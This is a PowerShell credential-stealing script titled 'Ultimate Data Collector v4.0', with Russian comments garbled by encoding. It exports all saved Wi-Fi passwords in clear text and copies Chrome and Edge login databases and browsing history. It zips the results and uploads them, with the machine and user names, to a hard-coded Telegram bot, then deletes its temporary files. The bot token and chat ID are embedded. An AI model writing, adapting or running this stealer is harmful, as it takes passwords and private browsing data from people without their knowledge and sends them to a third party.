<#
.SYNOPSIS
    üåü Ultimate Data Collector v4.0 üåü
.DESCRIPTION
    üìÇ –°–æ–±–∏—Ä–∞–µ—Ç: WiFi –ø–∞—Ä–æ–ª–∏, –ª–æ–≥–∏–Ω—ã/–ø–∞—Ä–æ–ª–∏ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤, –∏—Å—Ç–æ—Ä–∏—é –ø–æ—Å–µ—â–µ–Ω–∏–π
    üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∫—Ä–∞—Å–∏–≤–æ –æ—Ñ–æ—Ä–º–ª–µ–Ω–Ω—ã–π –æ—Ç—á–µ—Ç –≤ Telegram
#>

# üîê –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram
$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

# üì® –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ 
        chat_id = $CHAT_ID
        text = $Text
        parse_mode = "HTML"
    }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15
    } catch { 
        Start-Sleep -Seconds 3
        try { Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15 } catch {}
    }
}

# üìé –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–æ–≤
function Send-FileToTelegram {
    param([string]$FilePath)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    
    $body = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`";",
        "",
        $CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"

    try {
        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch { 
        Start-Sleep -Seconds 3
        try { Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body } catch {}
    }
}

# üì∂ –°–±–æ—Ä –ø–∞—Ä–æ–ª–µ–π WiFi (–†–ê–ë–û–ß–ê–Ø –≤–µ—Ä—Å–∏—è)
function Get-WiFiPasswords {
    $outputFile = "$TEMP_DIR\wifi_passwords.html"
    $result = @()
    
    # –ö—Ä–∞—Å–∏–≤—ã–π HTML-–∑–∞–≥–æ–ª–æ–≤–æ–∫
    $htmlHeader = @"
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Passwords</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #2c3e50; }
        .wifi { background: #f8f9fa; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
        .ssid { color: #e74c3c; font-weight: bold; }
        .pass { color: #27ae60; }
    </style>
</head>
<body>
    <h1>üîë –°–ø–∏—Å–æ–∫ WiFi –ø–∞—Ä–æ–ª–µ–π</h1>
"@

    try {
        # –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –ø—Ä–æ—Ñ–∏–ª–∏ WiFi
        $profiles = (netsh wlan show profiles) | 
                    Where-Object { $_ -match "All User Profile" } | 
                    ForEach-Object { $_.Split(":")[1].Trim() }
        
        foreach ($profile in $profiles) {
            try {
                # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π XML —Ñ–∞–π–ª
                $xmlFile = "$TEMP_DIR\$($profile.Replace(' ','_')).xml"
                netsh wlan export profile name=`"$profile`" key=clear folder="$TEMP_DIR" | Out-Null
                
                if (Test-Path $xmlFile) {
                    # –ò–∑–≤–ª–µ–∫–∞–µ–º –ø–∞—Ä–æ–ª—å –∏–∑ XML
                    $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
                    
                    # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –≤ –∫—Ä–∞—Å–∏–≤—ã–π HTML
                    $result += @"
    <div class="wifi">
        <span class="ssid">üì∂ $profile</span><br>
        <span class="pass">üîë $password</span>
    </div>
"@
                }
            } catch {
                $result += "<div class='wifi'>‚ùå –û—à–∏–±–∫–∞ —Å –ø—Ä–æ—Ñ–∏–ª–µ–º: $profile</div>"
            }
        }
    } catch {
        $result += "<div class='wifi'>‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ WiFi –ø–∞—Ä–æ–ª–µ–π</div>"
    }

    # –ó–∞–∫—Ä—ã–≤–∞–µ–º HTML
    $htmlFooter = @"
</body>
</html>
"@

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
    ($htmlHeader + ($result -join "`n") + $htmlFooter) | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# üåê –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤ (–ª–æ–≥–∏–Ω—ã –∏ –∏—Å—Ç–æ—Ä–∏—è)
function Get-BrowserData {
    $outputFile = "$TEMP_DIR\browser_data.html"
    
    # HTML-—à–∞–±–ª–æ–Ω
    $htmlHeader = @"
<!DOCTYPE html>
<html>
<head>
    <title>Browser Data</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #2c3e50; }
        .browser { margin-bottom: 30px; }
        .cred { background: #e8f4f8; padding: 10px; margin: 5px 0; border-radius: 3px; }
        .url { color: #3498db; }
        .login { color: #e67e22; }
        .history { background: #f5e8f8; padding: 8px; margin: 3px 0; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>üåê –î–∞–Ω–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä–æ–≤</h1>
"@

    $result = @()
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\" }
    )
    
    foreach ($browser in $browsers) {
        $browserResult = @()
        $browserResult += "<div class='browser'><h2>üñ•Ô∏è $($browser.Name)</h2>"
        
        try {
            # –ö–æ–ø–∏—Ä—É–µ–º —Ñ–∞–π–ª—ã –±—Ä–∞—É–∑–µ—Ä–∞
            $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
            New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
            
            # 1. –õ–æ–≥–∏–Ω—ã –∏ –ø–∞—Ä–æ–ª–∏
            $loginFile = Join-Path $browser.Path "Login Data"
            if (Test-Path $loginFile) {
                Copy-Item $loginFile "$browserDir\LoginData" -Force
                $browserResult += "<h3>üîë –õ–æ–≥–∏–Ω—ã:</h3>"
                
                # –ó–¥–µ—Å—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ª–æ–≥–∏–∫–∞ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∏–∑ SQLite –±–∞–∑—ã
                # –í —Ä–µ–∞–ª—å–Ω–æ–º —Å–∫—Ä–∏–ø—Ç–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ System.Data.SQLite
                $browserResult += "<div class='cred'>‚ö† –î–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –ø–∞—Ä–æ–ª–µ–π –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ DB Browser for SQLite</div>"
            }
            
            # 2. –ò—Å—Ç–æ—Ä–∏—è –ø–æ—Å–µ—â–µ–Ω–∏–π
            $historyFile = Join-Path $browser.Path "History"
            if (Test-Path $historyFile) {
                Copy-Item $historyFile "$browserDir\History" -Force
                $browserResult += "<h3>üïí –ò—Å—Ç–æ—Ä–∏—è –ø–æ—Å–µ—â–µ–Ω–∏–π:</h3>"
                $browserResult += "<div class='history'>–°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–æ $((Get-Item $historyFile).Length/1MB) MB –¥–∞–Ω–Ω—ã—Ö –∏—Å—Ç–æ—Ä–∏–∏</div>"
            }
            
        } catch {
            $browserResult += "<div class='cred'>‚ùå –û—à–∏–±–∫–∞: $($_.Exception.Message)</div>"
        }
        
        $browserResult += "</div>"
        $result += $browserResult -join "`n"
    }
    
    # –ó–∞–∫—Ä—ã–≤–∞–µ–º HTML
    $htmlFooter = @"
</body>
</html>
"@

    ($htmlHeader + ($result -join "`n") + $htmlFooter) | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# üìÇ –û—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
try {
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
    Send-ToTelegram -Text "üöÄ <b>–ù–∞—á–∞–ª—Å—è —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —Å $env:COMPUTERNAME</b> (`nüë§ $env:USERNAME`)"
    
    # 1. –°–æ–±–∏—Ä–∞–µ–º WiFi –ø–∞—Ä–æ–ª–∏
    $wifiFile = Get-WiFiPasswords
    
    # 2. –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä–æ–≤
    $browserFile = Get-BrowserData
    
    # 3. –ê—Ä—Ö–∏–≤–∏—Ä—É–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
    $zipFile = "$env:TEMP\Collected_Data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    Compress-Archive -Path @($wifiFile, $browserFile) -DestinationPath $zipFile -Force
    
    # 4. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞—Ä—Ö–∏–≤
    Send-FileToTelegram -FilePath $zipFile
    
    # 5. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏—Ç–æ–≥–æ–≤—ã–π –æ—Ç—á–µ—Ç
    $report = @"
<b>‚úÖ –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∑–∞–≤–µ—Ä—à–µ–Ω!</b>

üìÅ <i>–°–æ–±—Ä–∞–Ω–æ –¥–∞–Ω–Ω—ã—Ö:</i>
üì∂ WiFi –ø–∞—Ä–æ–ª–∏: $(if (Test-Path $wifiFile) {'‚úî'} else {'‚ùå'})
üåê –î–∞–Ω–Ω—ã–µ –±—Ä–∞—É–∑–µ—Ä–æ–≤: $(if (Test-Path $browserFile) {'‚úî'} else {'‚ùå'})

üì¶ <i>–ê—Ä—Ö–∏–≤ —Å–æ –≤—Å–µ–º–∏ –¥–∞–Ω–Ω—ã–º–∏:</i> <code>$(Split-Path $zipFile -Leaf)</code>

üïí <i>–í—Ä–µ–º—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è:</i> $(Get-Date -Format "HH:mm dd.MM.yyyy")
"@
    
    Send-ToTelegram -Text $report
}
catch {
    Send-ToTelegram -Text "‚ùå <b>–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö:</b> `n$($_.Exception.Message)"
}
finally {
    # –û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
}
